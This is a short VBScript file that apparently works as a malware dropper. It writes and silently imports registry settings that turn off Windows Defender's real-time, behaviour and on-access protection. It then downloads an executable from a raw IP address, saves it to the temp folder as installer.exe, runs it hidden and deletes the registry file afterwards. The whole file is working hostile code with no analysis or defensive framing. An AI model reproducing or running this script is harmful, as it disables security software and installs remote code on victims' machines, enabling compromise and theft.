Option Explicit
On Error Resume Next

Dim ws, regFile, shell, http, url, fileStream

' Function to disable Windows Defender silently
Set ws = CreateObject("WScript.Shell")
regFile = ws.ExpandEnvironmentStrings("%TEMP%") & "\disable_defender.reg"

Set fs = CreateObject("Scripting.FileSystemObject")
Set file = fs.CreateTextFile(regFile, True)
file.WriteLine "Windows Registry Editor Version 5.00"
file.WriteLine ""
file.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"
file.WriteLine """DisableAntiSpyware""=dword:00000001"
file.WriteLine """DisableRealtimeMonitoring""=dword:00000001"
file.WriteLine ""
file.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]"
file.WriteLine """DisableBehaviorMonitoring""=dword:00000001"
file.WriteLine """DisableOnAccessProtection""=dword:00000001"
file.WriteLine """DisableScanOnRealtimeEnable""=dword:00000001"
file.Close

' Import the registry settings to disable Windows Defender silently
Set shell = CreateObject("WScript.Shell")
shell.Run "regedit.exe /s " & regFile, 0, True

' Function to download a file silently
url = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.send

If http.Status = 200 Then
    Set fileStream = CreateObject("ADODB.Stream")
    fileStream.Type = 1 ' adTypeBinary
    fileStream.Open
    fileStream.Write http.ResponseBody
    fileStream.SaveToFile ws.ExpandEnvironmentStrings("%TEMP%") & "\installer.exe", 2
    fileStream.Close
End If

' Function to run an executable silently
Set shell = CreateObject("WScript.Shell")
shell.Run ws.ExpandEnvironmentStrings("%TEMP%") & "\installer.exe", 0, True

' Clean up the registry file
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists(regFile) Then
    fs.DeleteFile regFile
End If
